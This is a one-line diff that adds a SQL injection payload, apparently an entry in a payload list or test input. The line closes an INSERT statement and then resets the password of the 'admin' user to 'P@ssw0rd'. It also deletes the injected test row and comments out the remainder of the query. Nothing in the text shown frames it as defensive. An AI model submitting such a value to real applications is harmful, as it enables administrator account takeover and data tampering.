@@ -1,0 +1,1 @@
+test3', NULL);UPDATE Users SET Password='P@ssw0rd' WHERE Username='admin';DELETE FROM Users WHERE Username='test3';--
